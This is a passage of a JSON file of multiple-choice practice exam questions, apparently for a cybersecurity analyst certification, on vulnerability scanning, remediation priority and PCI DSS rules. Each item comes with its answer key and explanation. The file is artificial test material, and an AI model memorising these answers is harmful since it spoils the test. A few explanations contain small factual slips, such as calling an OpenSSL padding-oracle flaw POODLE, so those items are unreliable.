application"},{"id":"d2-81","set":"d2","ch":7,"d":2,"q":"If an attacker is able to exploit this vulnerability, what is the probable result that will have the highest impact on the organization?","o":["Administrative control of the server","Complete control of the domain","Access to configuration information","Access to web application logs"],"a":0,"e":"Since this is an escalation of privilege vulnerability, it is likely that an attacker could gain complete control of the system. There is no indication that control of this system would then lead to complete control of the domain. Administrative control of the server would grant access to configuration information and web application logs, but these issues are not as serious as an attacker gaining complete control of the server.","l":"c7-server-network","l2":"","k":"privilege escalation impact"},{"id":"d2-82","set":"d2","ch":6,"d":2,"q":"Ted is configuring vulnerability scanning for a file server on his company’s internal network. The server is positioned on the network as shown here. What types of vulnerability scans should Ted perform to balance the efficiency of scanning effort with expected results?<figure><img alt=\"Network diagram details Internet connecting Firewall, Data Center Network with 2 servers, and Screened Subnet D M Z with a Web Server.\" loading=\"lazy\" src=\"img/pt/c02un022.png\"/></figure>","o":["Ted should not perform scans of servers on the internal network.","Ted should perform only internal vulnerability scans.","Ted should perform only external vulnerability scans.","Ted should perform both internal and external vulnerability scans."],"a":1,"e":"This server is located on an internal network and has only a private IP address. Therefore, the only scan that would provide any valid results is an internal scan. The external scanner would not be able to reach the file server through a valid IP address.","l":"c6-config","l2":"","k":"internal vulnerability scan scoping"},{"id":"d2-83","set":"d2","ch":6,"d":2,"q":"Zahra is attempting to determine the next task that she should take on from a list of security priorities. Her boss told her that she should focus on activities that have the most “bang for the buck.” Of the tasks shown here, which should she tackle first?<figure><img alt=\"Table details 4 security issues, including S Q L injection and firewall patch, criticality, with fix times ranging from 6 hours to 3 weeks.\" loading=\"lazy\" src=\"img/pt/c02un023.png\"/></figure>","o":["Task 1","Task 2","Task 3","Task 4"],"a":0,"e":"Task 1 strikes the best balance between criticality and difficulty. It allows Zahra to remediate a medium criticality issue with an investment of only six hours of time. Task 2 is higher criticality but would take 3 weeks to resolve. Task 3 is the same criticality but would require 2 days to fix. Task 4 is lower criticality but would require the same amount of time to resolve as Task 1.","l":"c6-remediation","l2":"c7-validate","k":"remediation effort prioritization"},{"id":"d2-84","set":"d2","ch":7,"d":2,"q":"Morgan is interpreting a vulnerability scan from her organization’s network, a diagram of which is shown here. The scan results were produced using CVSS ratings from the National Vulnerability Database. Morgan would like to determine which vulnerability to remediate first. She would like to focus on vulnerabilities that are most easily exploitable by someone outside her organization. Assuming the firewall is properly configured, which one of the following vulnerabilities should Morgan give the highest priority?<figure><img alt=\"Network diagram shows a firewall connects internet, an internal network with a workstation, server, and a screened subnet with 2 servers.\" loading=\"lazy\" src=\"img/pt/c02un024.png\"/></figure>","o":["Severity 5 vulnerability in the workstation","Severity 1 vulnerability in the file server","Severity 5 vulnerability in the web server","Severity 1 vulnerability in the mail server"],"a":2,"e":"The severity 5 vulnerability in the web server deserves the highest priority because the web server is exposed to external users through the firewall, so an attacker on the Internet can reach it directly, and a high CVSS score indicates that it is both impactful and relatively easy to exploit. The severity 5 issue on the workstation is also serious, but that system is on the internal network behind the firewall and not directly reachable from outside the organization, so an external attacker would first need another compromise before using it. The severity 1 vulnerability on the file server is on another internal system and has a very low CVSS rating, so it represents a much smaller and less accessible risk to someone outside the network. The severity 1 vulnerability on the mail server is on a system that may accept traffic from the Internet, but the low CVSS score indicates low impact and/or difficulty of exploitation, so it is still less urgent than the high-severity flaw on the publicly reachable web server.","l":"c7-validate","l2":"c6-remediation","k":"severity ranking prioritization"},{"id":"d2-85","set":"d2","ch":7,"d":2,"q":"Mike runs a vulnerability scan against his company’s virtualization environment and finds the vulnerability shown here in several of the virtual hosts. What action should Mike take?<figure><img alt=\"Screenshot details a description of H T T P methods allowed per directory and plugin tests using response codes 400, 403, 405, and 501.\" loading=\"lazy\" src=\"img/pt/c02un025.png\"/></figure>","o":["No action is necessary because this is an informational report.","Mike should disable HTTPS on the affected devices.","Mike should upgrade the version of OpenSSL on the affected devices.","Mike should immediately upgrade the hypervisor."],"a":0,"e":"This is an informational-level report that will be discovered on any server that supports the <code>OPTIONS</code> method. This is not a serious issue and is listed as an informational item, so Mike does not need to take any action to address it.","l":"c7-validate","l2":"","k":"informational scan result handling"},{"id":"d2-86","set":"d2","ch":5,"d":2,"q":"Juan recently scanned a system and found that it was running services on ports 139 and 445. What operating system is this system most likely running?","o":["Ubuntu","macOS","Kali","Windows"],"a":3,"e":"Ports 139 and 445 are associated with Windows systems that support file and printer sharing.","l":"c5-portscan","l2":"c7-server-network","k":"Windows SMB file sharing ports"},{"id":"d2-87","set":"d2","ch":7,"d":2,"q":"Gene is concerned about the theft of sensitive information stored in a database. Which one of the following vulnerabilities would pose the most direct threat to this information?","o":["SQL injection","Cross-site scripting","Buffer overflow","Denial-of-service"],"a":0,"e":"Although a buffer overflow attack could theoretically have an impact on information stored in the database, a SQL injection vulnerability poses a more direct threat by allowing an attacker to execute arbitrary SQL commands on the database server. Cross-site scripting attacks are primarily user-based threats that would not normally allow database access. A denial-of-service attack targets system availability, rather than information disclosure.","l":"c7-web-ot","l2":"","k":"database sensitive data theft"},{"id":"d2-88","set":"d2","ch":7,"d":2,"q":"Which one of the following protocols is not likely to trigger a vulnerability scan alert when used to support a virtual private network (VPN)?","o":["IPsec","SSL v2","PPTP","SSL v3"],"a":0,"e":"IPsec is a secure protocol for establishing VPN links. Organizations should no longer use the obsolete Secure Sockets Layer (SSL) or Point-to-Point Tunneling Protocol (PPTP) for VPN connections or other secure connections.","l":"c7-server-network","l2":"c2-crypto","k":"secure VPN protocols"},{"id":"d2-89","set":"d2","ch":6,"d":2,"q":"Rahul is working on a significant change to a credit card processing system that will run in his environment. As he prepared to launch the system into production, he ran an external vulnerability scan of the system. He found a vulnerability with a CVSS score of 5.8. What action must Rahul take?\n<p><a href=\"#Que90\">Questions 90</a> and <a href=\"#Que91\">91</a> refer to the following scenario:</p>\n<p>Aaron is scanning a server in his organization’s datacenter and receives the vulnerability report shown here. The service is exposed only to internal hosts.</p>\n<figure><img alt=\"Screenshot lists N T P Information Disclosure Vulnerability report with Q I D, C V S S score, threat, impact, solution, and exploitability.\" loading=\"lazy\" src=\"img/pt/c02un026.png\"/></figure>","o":["Remediate the vulnerability if possible.","Remediate the vulnerability prior to moving the system into production and rerun the scan to obtain a clean result.","Remediate the vulnerability within 90 days of moving the system to production.","No action is required."],"a":1,"e":"Rahul must fix the vulnerability before putting the system into production and then rerun the external scan to confirm that it no longer appears, because PCI DSS external vulnerability scans fail if any Internet-facing system has a CVSS score of 4.0 or higher, and a 5.8 finding clearly exceeds that threshold, so a “passing” result is required before the system is considered compliant. The approach that says only to remediate if possible is insufficient because PCI requires remediation and verification with a passing scan, not a best-effort attempt. The suggestion to remediate within 90 days confuses the quarterly scan frequency with a grace period and incorrectly allows the system into production while still failing PCI scan criteria. The idea that no action is required is wrong because leaving a 5.8 vulnerability unaddressed on a credit card processing system would both violate PCI requirements and expose cardholder data to unnecessary risk.","l":"c6-requirements","l2":"c6-remediation","k":"PCI DSS pre-production remediation"},{"id":"d2-90","set":"d2","ch":5,"d":2,"q":"What is the normal function of the service with this vulnerability?","o":["File transfer","Web hosting","Time synchronization","Network addressing"],"a":2,"e":"This vulnerability is with the Network Time Protocol (NTP), a service that runs on UDP port 123. NTP is responsible for providing synchronizing for the clocks of servers, workstations, and other devices in the organization.","l":"c5-portscan","l2":"c2-logging","k":"Network Time Protocol function"},{"id":"d2-91","set":"d2","ch":7,"d":2,"q":"What priority should Aaron place on remediating this vulnerability?","o":["Aaron should make this vulnerability his highest priority.","Aaron should remediate this vulnerability urgently but does not need to drop everything.","Aaron should remediate this vulnerability within the next month.","Aaron does not need to assign any priority to remediating this vulnerability."],"a":3,"e":"Aaron should treat this vulnerability as a fairly low priority and may never get around to remediating it if there are more critical issues on his network. The vulnerability has a severity rating of 2 (out of 5), and the vulnerability is further mitigated by the fact that the server is accessible only from the local network.","l":"c7-validate","l2":"c6-remediation","k":"low-severity vulnerability prioritization"},{"id":"d2-92","set":"d2","ch":7,"d":2,"q":"Without access to any additional information, which one of the following vulnerabilities would you consider the most severe if discovered on a production web server?","o":["CGI generic SQL injection","Web application information disclosure","Web server uses basic authentication without HTTPS","Web server directory enumeration"],"a":0,"e":"The SQL injection attack could be quite serious, since it may allow an attacker to retrieve and/or modify information stored in the back-end database. The second-highest priority should be resolving the use of unencrypted authentication, because it may allow the theft of user credentials. The remaining two vulnerabilities are less serious, because they pose only a reconnaissance risk.","l":"c7-web-ot","l2":"c7-validate","k":"critical web application vulnerabilities"},{"id":"d2-93","set":"d2","ch":7,"d":2,"q":"Gina ran a vulnerability scan on three systems that her organization is planning to move to production and received the results shown here. How many of these issues should Gina require be resolved before moving to production?<figure><img alt=\"Screenshot shows 3 lists of security vulnerabilities with R P C and S S L protocol issues for H P i L O and Virtualized Linux Guest systems.\" loading=\"lazy\" src=\"img/pt/c02un027.png\"/></figure>","o":["0.","1.","3.","All of these issues should be resolved."],"a":0,"e":"The report notes that all of the vulnerabilities for these three servers are in Fixed status. This indicates that the vulnerabilities existed but have already been remediated and no additional work is required.","l":"c7-validate","l2":"c6-remediation","k":"remediated vulnerability status"},{"id":"d2-94","set":"d2","ch":6,"d":2,"q":"Ji-won recently restarted an old vulnerability scanner that had not been used in more than a year. She booted the scanner, logged in, and configured a scan to run. After reading the scan results, she found that the scanner was not detecting known vulnerabilities that were detected by other scanners. What is the most likely cause of this issue?","o":["The scanner is running on an outdated operating system.","The scanner’s maintenance subscription is expired.","Ji-won has invalid credentials on the scanner.","The scanner does not have a current, valid IP address."],"a":1,"e":"The most likely issue is that the maintenance subscription for the scanner expired while it was inactive and the scanner is not able to retrieve current signatures from the vendor’s vulnerability feed. The operating system of the scanner should not affect the scan results. Ji-won would not be able to access the scanner at all if she had invalid credentials or the scanner had an invalid IP address.","l":"c6-config","l2":"","k":"scanner subscription feed maintenance"},{"id":"d2-95","set":"d2","ch":6,"d":2,"q":"Isabella runs both internal and external vulnerability scans of a web server and detects a possible SQL injection vulnerability. The vulnerability appears only in the internal scan and does not appear in the external scan. When Isabella checks the server logs, she sees the requests coming from the internal scan and sees some requests from the external scanner but no evidence that a SQL injection exploit was attempted by the external scanner. What is the most likely explanation for these results?","o":["A host firewall is blocking external network connections to the web server.","A network firewall is blocking external network connections to the web server.","A host IPS is blocking some requests to the web server.","A network IPS is blocking some requests to the web server."],"a":3,"e":"The most likely scenario is that a network IPS is blocking SQL injection attempts sent to this server, and the internal scanner is positioned on the network in such a way that it is not filtered by the network IPS. If a host IPS were blocking the requests, the vulnerability would likely not appear on internal scans either. If a firewall were blocking the requests, then no external scanner entries would appear in the log file.","l":"c6-config","l2":"c7-validate","k":"internal vs external scan discrepancy"},{"id":"d2-96","set":"d2","ch":7,"d":2,"q":"Rick discovers the vulnerability shown here in a server running in his datacenter. What characteristic of this vulnerability should concern him the most?<figure><img alt=\"Screenshot details Microsoft security update M S 17-018 for Windows with 8 C V E I Ds, C V S S scores, threat summary, and solution details.\" loading=\"lazy\" src=\"img/pt/c02un028.png\"/></figure>","o":["It is the subject of a recent security bulletin.","It has a CVSS score of 7.8.","There are multiple Bugtraq and CVE IDs.","It affects kernel-mode drivers."],"a":3,"e":"The fact that this vulnerability affects kernel-mode drivers is very serious, because it indicates that an attacker could compromise the core of the operating system in an escalation of privilege attack. The other statements made about this vulnerability are all correct, but they are not as serious as the kernel-mode issue.","l":"c7-server-network","l2":"","k":"kernel-mode driver vulnerabilities"},{"id":"d2-97","set":"d2","ch":7,"d":2,"q":"Carl runs a vulnerability scan of a mail server used by his organization and receives the vulnerability report shown here. What action should Carl take to correct this issue?<figure><img alt=\"Screenshot shows security report for Open S S L oracle padding vulnerability C V E 2016 to 2107 on port 443 detected 5 times in August 2016.\" loading=\"lazy\" src=\"img/pt/c02un029.png\"/></figure>","o":["Carl does not need to take any action because this is an informational report.","Carl should replace SSL with TLS on this server.","Carl should disable weak ciphers.","Carl should upgrade OpenSSL."],"a":3,"e":"This is an example of the POODLE vulnerability that exploits weaknesses in the OpenSSL encryption library. While replacing SSL with TLS and disabling weak ciphers are good practices, they will not correct this issue. Carl should upgrade OpenSSL to a more current version that does not contain this vulnerability.","l":"c7-server-network","l2":"c2-crypto","k":"POODLE SSL vulnerability remediation"},{"id":"d2-98","set":"d2","ch":6,"d":2,"q":"Renee is configuring a vulnerability scanner that will run scans of her network. Corporate policy requires the use of daily vulnerability scans. What would be the best time to configure the scans?","o":["During the day when operations reach their peak to stress-test systems","During the evening when operations are minimal to reduce the impact on systems","During lunch hour when people have stepped away from their systems but there is still considerable load","On the weekends when the scans may run unimpeded"],"a":1,"e":"According to corporate policy, Renee must run the scans on a daily basis, so the weekend is not a viable option. The scans should run when they have the least impact on operations, which, in this scenario, would be in the evening. The purpose of vulnerability scans is to identify known vulnerabilities in systems and not to perform load testing of servers.","l":"c6-requirements","l2":"c6-config","k":"scan window scheduling policy"},{"id":"d2-99","set":"d2","ch":7,"d":2,"q":"Ahmed is reviewing the vulnerability scan report from his organization’s central storage service and finds the results shown here. Which action can Ahmed take that will be effective in remediating the highest-severity issue possible?<figure><img alt=\"Screenshot details 22 vulnerabilities, including descriptions, severity ratings, network ports, C V S S scores, and status.\" loading=\"lazy\" src=\"img/pt/c02un030.png\"/></figure>\n<p><a href=\"#Que100\">Questions 100</a> and <a href=\"#Que101\">101</a> refer to the following scenario:</p>\n<p>Glenda ran a vulnerability scan of workstations in her organization. She noticed that many of the workstations reported the vulnerability shown here. She would like to not only correct this issue but also prevent the likelihood of similar issues occurring in the future.</p>\n<figure><img alt=\"Screenshot details Google Chrome vulnerabilities with a C V S S score of 9.3, threat details, impact, and solution for versions before 57.\" loading=\"lazy\" src=\"img/pt/c02un031.png\"/></figure>","o":["Upgrade to SNMP v3.","Disable the use of RC4.","Replace the use of SSL with TLS.","Disable remote share enumeration."],"a":0,"e":"The highest-severity vulnerability in this report is the use of an outdated version of SNMP. Ahmed can correct this issue by disabling the use of SNMP v1 and SNMP v2, which contain uncorrectable security issues, and replacing them with SNMP v3. The other actions offered as choices in this question would remediate other vulnerabilities shown in the report, but they are all of lower severity than the SNMP issue.","l":"c7-server-network","l2":"c1-network","k":"SNMP version upgrade"},{"id":"d2-100","set":"d2","ch":8,"d":2,"q":"What action should Glenda take to achieve her goals?","o":["Glenda should uninstall Chrome from all workstations.","Glenda should manually upgrade Chrome on all workstations.","Glenda should configure all workstations to automatically upgrade Chrome.","Glenda does not need to take any action."],"a":2,"e":"Glenda can easily resolve this issue by configuring workstations to automatically upgrade Chrome. It is reasonable to automatically deploy Chrome updates to workstations because of the fairly low impact of a failure and the fact that users could switch to another browser in the event of a failure. Manually upgrading Chrome would also resolve the issue, but it would not prevent future issues. Removing Chrome would resolve this issue but create others, by leaving users without a web browser. This is a serious issue, so Glenda should not ignore the report.","l":"c8-controls","l2":"c6-remediation","k":"automated browser patch deployment"},{"id":"d2-101","set":"d2","ch":6,"d":2,"q":"What priority should Glenda place on remediating this vulnerability?","o":["Glenda should make this vulnerability her highest priority.","Glenda should remediate this vulnerability urgently but does not need to drop everything.","Glenda should remediate this vulnerability within the next several months.","Glenda does not need to assign any priority to remediating this vulnerability."],"a":0,"e":"Glenda should remediate this vulnerability as quickly as possible because it occurs widely throughout her organization and has a significant severity (4 on a 5-point scale). If an attacker exploits this vulnerability, they could take control of the affected system by executing arbitrary code on it.","l":"c6-remediation","l2":"c7-validate","k":"widespread vulnerability remediation priority"},{"id":"d2-102","set":"d2","ch":5,"d":2,"q":"After reviewing the results of a vulnerability scan, Gabriella discovered a flaw in her Oracle database server that may allow an attacker to attempt a direct connection to the server. She would like to review NetFlow logs to determine what systems have connected to the server recently. What TCP port should Gabriella expect to find used for this communication?","o":["443","1433","1521","8080"],"a":2,"e":"Oracle database servers use port 1521 for database connections. Port 443 is used for HTTPS connections to a web server. Microsoft SQL Server uses port 1433 for database connections. Port 8080 is a nonstandard port for web services.","l":"c5-portscan","l2":"","k":"Oracle database port identification"},{"id":"d2-103","set":"d2","ch":6,"d":2,"q":"Terry recently ran an internal vulnerability scan against his organization’s credit card processing environment that found a number of vulnerabilities. Which vulnerabilities must he remediate to have a “clean” scan under PCI DSS standards?","o":["Critical vulnerabilities","Critical and high vulnerabilities","Critical, high, and medium vulnerabilities","Critical, high, medium, and low vulnerabilities"],"a":1,"e":"The PCI DSS standard requires that merchants and service providers remediate any critical or high level vulnerabilities discovered during internal vulnerability scans. This is different from the requirement for external vulnerability scans, which requires remediating any vulnerabilities with a CVSS score of 4.0 or higher.","l":"c6-requirements","l2":"c6-remediation","k":"PCI DSS remediation thresholds"},{"id":"d2-104","set":"d2","ch":7,"d":2,"q":"Himari discovers the vulnerability shown here on several Windows systems in her organization. A patch is available, but it requires compatibility testing that will take several days to complete. What type of file should Himari be watchful for because it may directly exploit this vulnerability?<figure><img alt=\"Screenshot details Microsoft Windows P N G vulnerability M S 15-024 and C V E 2015-0080 with score 4.3 and 20 detections.\" loading=\"lazy\" src=\"img/pt/c02un032.png\"/></figure>","o":["Private key files","Word documents","Image files","Encrypted files"],"a":2,"e":"The vulnerability shown here affects PNG processing on systems running Windows. PNG is an acronym for Portable Network Graphics and is a common image file format.","l":"c7-server-network","l2":"","k":"image processing library vulnerabilities"},{"id":"d2-105","set":"d2","ch":6,"d":2,"q":"Aaron is configuring a vulnerability scan for a Class C network and is trying to choose a port setting from the list shown here. He would like to choose a scan option that will efficiently scan his network but also complete in a reasonable period of time. Which setting would be most appropriate?<figure><img alt=\"Screenshot lists scan options for None, Full, Standard Scan about 1900 ports, Light Scan about 160 ports, and Additional with a text field.\" loading=\"lazy\" src=\"img/pt/c02un033.png\"/></figure>","o":["None","Full","Standard Scan","Light Scan"],"a":2,"e":"The standard scan of 1,900 common ports is a reasonably thorough scan that will conclude in a realistic period of time. If Aaron knows of specific ports used in his organization that are not included in the standard list, he could specify them using the Additional section of the port settings. A full scan of all 65,536 ports would require a significant period of time on a Class C network. Choosing the Light Scan (about 160 ports) setting would exclude a large number of commonly used ports, whereas the None setting would not scan any ports.","l":"c6-config","l2":"","k":"standard port scan scoping"},{"id":"d2-106","set":"d2","ch":7,"d":2,"q":"Haruto is reviewing the results of a vulnerability scan, shown here, from a web server in his organization. Access to this server is restricted at the firewall so that it may not be accessed on port 80 or 443. Which of the following vulnerabilities should Haruto still address?<figure><img alt=\"Screenshot details 6 security vulnerabilities with severity levels from 1 to 5, covering Open S S L, Apache, H T T P, and load balancing.\" loading=\"lazy\" src=\"img/pt/c02un034.png\"/></figure>","o":["OpenSSL version.","Cookie information disclosure.","TRACE / TRACK methods.","Haruto does not need to address any of these vulnerabilities because they are not exposed to the outside world."],"a":0,"e":"From the information given in the scenario, you can conclude that all of the HTTP/HTTPS vulnerabilities are not exploitable by an attacker because of the firewall restrictions. However, OpenSSL is an encryption package used for other services, in addition to HTTPS. Therefore, it may still be exposed via SSH or other means. Haruto should replace it with a current, supported version because running an end-of-life (EOL) version of this package exposes the organization to potentially unpatchable security vulnerabilities.","l":"c7-server-network","l2":"c2-crypto","k":"OpenSSL version vulnerability"},{"id":"d2-107","set":"d2","ch":6,"d":2,"q":"Brian is considering the use of several different categories of vulnerability plug-ins. Of the types listed here, which is the most likely to result in false positive reports?","o":["Registry inspection","Banner grabbing","Service interrogation","Fuzzing"],"a":1,"e":"Banner grabbing scans are notorious for resulting in false positive reports because the only validation they do is to check the version number of an operating system or application against a list of known vulnerabilities. This approach is unable to detect any remediation activities that may have taken place that do not alter the version number.","l":"c6-config","l2":"c7-validate","k":"banner grabbing false positives"},{"id":"d2-108","set":"d2","ch":7,"d":2,"q":"Binh conducts a vulnerability scan and finds three different vulnerabilities, with the CVSS vectors shown here. Which vulnerability should be his highest priority to fix, assuming all three fixes are of equal difficulty?<figure><img alt=\"Screenshot details three vulnerabilities with C V S S 3.0 vector strings.\" loading=\"lazy\" src=\"img/pt/c02un035.png\"/></figure>","o":["Vulnerability 1.","Vulnerability 2.","Vulnerability 3.","Vulnerabilities 1 and 3 are equal in priority."],"a":2,"e":"Vulnerability 3 has a CVSS score of 10.0 because it received the highest possible ratings on all portions of the CVSS vector. All three vulnerabilities have ratings of “high” for the confidentiality, integrity, and availability impact metrics. Vulnerabilities 1 and 2 have lower values for one or more of the exploitability metrics, meaning that weaponization of those vulnerabilities would likely be more difficult.","l":"c7-cvss","l2":"c7-validate","k":"CVSS maximum score rating"},{"id":"d2-109","set":"d2","ch":7,"d":2,"q":"Which one of the following is not an appropriate criterion to use when prioritizing the remediation of vulnerabilities?","o":["Network exposure of the affected system.","Difficulty of remediation.","Severity of the vulnerability.","All of these are appropriate."],"a":3,"e":"A cybersecurity analyst should consider all of these factors when prioritizing remediation of vulnerabilities. The severity of the vulnerability is directly related to the risk involved. The likelihood of the vulnerability being exploited may be increased or reduced based on the affected system’s network exposure. The difficulty of remediation may impact the team’s ability to correct the issue with a reasonable commitment of resources.","l":"c7-validate","l2":"c6-remediation","k":"remediation prioritization factors"},{"id":"d2-110","set":"d2","ch":6,"d":2,"q":"Landon is preparing to run a vulnerability scan of a dedicated Apache server that his organization is planning to move into a screened subnet (DMZ). Which one of the following vulnerability scans is <i>least</i> likely to provide informative results?","o":["Web application vulnerability scan","Database vulnerability scan","Port scan","Network vulnerability scan"],"a":1,"e":"There is no indication in the scenario that the server is running a database; in fact, the scenario indicates that the server is dedicated to running the Apache web service. Therefore, it is unlikely that a database vulnerability scan would yield any results. Landon should run the other three scans, and if they indicate the presence of a database server, he could follow up with a specialized database vulnerability scan.","l":"c6-config","l2":"","k":"scan profile optimization"},{"id":"d2-111","set":"d2","ch":7,"d":2,"q":"Ken recently received the vulnerability report shown here that affects a file server used by his organization. What is the primary nature of the risk introduced by this vulnerability?<figure><img alt=\"Screenshot details Net B I O S Name Conflict Vulnerability report with C V S S score of 5, threat, impact, solutions, and Windows patches.\" loading=\"lazy\" src=\"img/pt/c02un036.png\"/></figure>","o":["Confidentiality","Integrity","Availability","Nonrepudiation"],"a":2,"e":"The vulnerability report’s impact statement reads as follows: “If successfully exploited, this vulnerability could lead to intermittent connectivity problems, or the loss of all NetBIOS functionality.” This is a description of an availability risk.","l":"c7-cvss","l2":"c1-objectives","k":"CVSS availability impact metric"},{"id":"d2-112","set":"d2","ch":8,"d":2,"q":"Aadesh is creating a vulnerability management program for his company. He has limited scanning resources and would like to apply them to different systems based on the sensitivity and criticality of the information that they handle. What criterion should Aadesh use to determine the vulnerability scanning frequency?","o":["Data remanence","Data privacy","Data classification","Data sovereignty"],"a":2,"e":"Data classification is a set of labels applied to information based on their degree of sensitivity and/or criticality. It would be the most appropriate choice in this scenario. Data remanence is an issue where information thought to be deleted may still exist on systems. Data privacy may contribute to data classification but does not encompass the entire field of data sensitivity and criticality in the same manner as data classification. For example, a system may process proprietary business information that would be very highly classified and require frequent vulnerability scanning. Unless that system also processed personally identifiable information, it would not trigger scans under a system based solely on data privacy. Data sovereignty concerns where data is stored and which country’s laws apply, which may affect legal and regulatory obligations but does not inherently provide a structured way to prioritize scan frequency by sensitivity and criticality.","l":"c8-governance","l2":"c2-crypto","k":"data classification schemes"},{"id":"d2-113","set":"d2","ch":8,"d":2,"q":"Tom recently read a media report about a ransomware outbreak that was spreading rapidly across the Internet by exploiting a zero-day vulnerability in Microsoft Windows. As part of a comprehensive response, he would like to include a control that would allow his organization to effectively recover from a ransomware infection. Which one of the following controls would best achieve Tom’s objective?","o":["Security patching","Host firewalls","Backups","Intrusion prevention systems"],"a":2,"e":"In this scenario, a host firewall may be an effective way to prevent infections from occurring in the first place, but it will not expedite the recovery of a system that is already infected. Intrusion prevention systems and security patches will generally not be effective against a zero-day attack and also would not serve as a recovery control. Backups would provide Tom with an effective way to recover information that was encrypted during a ransomware attack.","l":"c8-controls","l2":"c11-recover","k":"ransomware defense in depth"},{"id":"d2-114","set":"d2","ch":7,"d":2,"q":"Kaitlyn discovered the vulnerability shown here on a workstation in her organization. Which one of the following is <i>not</i> an acceptable method for remediating this vulnerability?<figure><img alt=\"Screenshot lists details for Win R A R vulnerability C V E 2015-5663, C V S S base score 3.7, and remote code execution information.\" loading=\"lazy\" src=\"img/pt/c02un037.png\"/></figure>","o":["Upgrade WinRAR.","Upgrade Windows.","Remove WinRAR.","Replace WinRAR with an alternate compression utility."],"a":1,"e":"There is no reason to believe that upgrading the operating system will resolve this application vulnerability. All of the other solutions presented are acceptable ways to address this risk.","l":"c7-server-network","l2":"c6-remediation","k":"application patch vs OS upgrade"},{"id":"d2-115","set":"d2","ch":5,"d":2,"q":"Brent ran a vulnerability scan of several network infrastructure devices on his network and obtained the result shown here. What is the extent of the impact that an attacker could have by exploiting this vulnerability directly?<figure><img alt=\"Screenshot details a security report for S N M P Information with Q I D 78030, C V S S score 10, and details on insecure passwords.\" loading=\"lazy\" src=\"img/pt/c02un038.png\"/></figure>","o":["Denial of service","Theft of sensitive information","Network eavesdropping","Reconnaissance"],"a":3,"e":"This is a serious vulnerability because it exposes significant network configuration information to attackers and could be used to wage other attacks on this network. However, the direct impact of this vulnerability is limited to reconnaissance of network configuration information.","l":"c5-recon","l2":"c7-server-network","k":"network reconnaissance information disclosure"},{"id":"d2-116","set":"d2","ch":6,"d":2,"q":"Yashvir runs the cybersecurity vulnerability management program for his organization. He sends a database administrator a report of a missing database patch that corrects a high-severity security issue. The DBA writes back to Yashvir that he has applied the patch. Yashvir reruns the scan, and it still reports the same vulnerability. What should he do next?","o":["Mark the vulnerability as a false positive.","Ask the DBA to recheck the database server.","Mark the vulnerability as an exception.","Escalate the issue to the DBA’s manager."],"a":1,"e":"In this case, Yashvir should ask the DBA to recheck the server to ensure that the patch was properly applied. It is not yet appropriate to mark the issue as a false positive report until Yashvir performs a brief investigation to confirm that the patch is applied properly. This is especially true because the vulnerability relates to a missing patch, which is not a common source of false positive reports. There was no acceptance of this vulnerability, so Yashvir should not mark it as an exception. He should not escalate this issue to management because the DBA is working with him in good faith.","l":"c6-remediation","l2":"c7-validate","k":"patch installation verification"},{"id":"d2-117","set":"d2","ch":7,"d":2,"q":"Manya is reviewing the results of a vulnerability scan and identifies the issue shown here in one of her systems. She consults with developers who check the code and assure her that it is not vulnerable to SQL injection attacks. An independent auditor confirms this for Manya. What is the most likely scenario?<figure><img alt=\"Screenshot details a high severity security report for blind time based C G I Generic S Q L Injection with a description and solution.\" loading=\"lazy\" src=\"img/pt/c02un039.png\"/></figure>","o":["This is a false positive report.","The developers are wrong, and the vulnerability exists.","The scanner is malfunctioning.","The database server is misconfigured."],"a":0,"e":"This is most likely a false positive report. The vulnerability description says, “note that this script is experimental and may be prone to false positives.” It is less likely that the developers and independent auditors are all incorrect. The scanner is most likely functioning properly, and there is no indication that either it or the database server is misconfigured.","l":"c7-validate","l2":"","k":"scan report false positive identification"},{"id":"d2-118","set":"d2","ch":7,"d":2,"q":"Erik is reviewing the results of a vulnerability scan and comes across the vulnerability report shown here. Which one of the following services is <i>least</i> likely to be affected by this vulnerability?<figure><img alt=\"Screenshot details X 509 Certificate M D 5 Signature Collision Vulnerability with C V E 2004-2761, C V S S base 5, and 86 detections.\" loading=\"lazy\" src=\"img/pt/c02un040.png\"/></figure><p><a href=\"#Que119\">Questions 119</a>–<a href=\"#Que120\">120</a> refer to the following scenario:</p>\n<p>Larry recently discovered a critical vulnerability in one of his organization’s database servers during a routine vulnerability scan. When he showed the report to a database administrator, the administrator responded that they had corrected the vulnerability by using a vendor-supplied workaround because upgrading the database would disrupt an important process. Larry verified that the workaround is in place and corrects the vulnerability.</p>","o":["HTTPS","HTTP","SSH","VPN"],"a":1,"e":"X.509 certificates are used to exchange public keys for encrypted communications. They are a fundamental part of the SSL and TLS protocols, and an issue in an X.509 certificate may definitely affect HTTPS, SSH, and VPN communications that depend on public key cryptography. HTTP does not use encryption and would not be subject to this vulnerability.","l":"c7-server-network","l2":"c2-crypto","k":"X.509 digital certificate protocols"},{"id":"d2-119","set":"d2","ch":7,"d":2,"q":"How should Larry respond to this situation?","o":["Mark the report as a false positive.","Insist that the administrator apply the vendor patch.","Mark the report as an exception.","Require that the administrator submit a report describing the workaround after each vulnerability scan."],"a":0,"e":"This is an example of a false positive report. The administrator demonstrated that the database is not subject to the vulnerability because of the workaround, and Larry went a step further and verified this himself. Therefore, he should mark the report as a false positive in the vulnerability scanner.","l":"c7-validate","l2":"","k":"false positive documentation"},{"id":"d2-120","set":"d2","ch":7,"d":2,"q":"What is the most likely cause of this report?","o":["The vulnerability scanner requires an update.","The vulnerability scanner depends on version detection.","The database administrator incorrectly applied the workaround.","Larry misconfigured the scan."],"a":1,"e":"False positive reports like the one described in this scenario are common when a vulnerability scanner depends on banner grabbing and version detection. The primary solution to this issue is applying a patch that the scanner would detect by noting a new version number. However, the administrator performed the perfectly acceptable action of remediating the vulnerability in a different manner without applying the patch, but the scanner is unable to detect that remediation activity and is reporting a false positive result.","l":"c7-validate","l2":"c6-config","k":"version-based banner false positives"},{"id":"d2-121","set":"d2","ch":5,"d":2,"q":"Mila ran a vulnerability scan of a server in her organization and found the vulnerability shown here. What is the use of the service affected by this vulnerability?<figure><img alt=\"Screenshot details a vulnerability report for POP 3 cleartext logins with low severity, description, solution, risk information, and output.\" loading=\"lazy\" src=\"img/pt/c02un041.png\"/></figure>","o":["Web server","Database server","Email server","Directory server"],"a":2,"e":"The Post Office Protocol v3 (POP3) is used for retrieving email from an email server.","l":"c5-portscan","l2":"","k":"POP3 email port identification"},{"id":"d2-122","set":"d2","ch":7,"d":2,"q":"Margot discovered that a server in her organization has a SQL injection vulnerability. She would like to investigate whether attackers have attempted to exploit this vulnerability. Which one of the following data sources is <i>least</i> likely to provide helpful information?","o":["NetFlow logs","Web server logs","Database logs","IDS logs"],"a":0,"e":"Margot can expect to find relevant results in the web server logs because they would contain records of HTTP requests to the server. Database 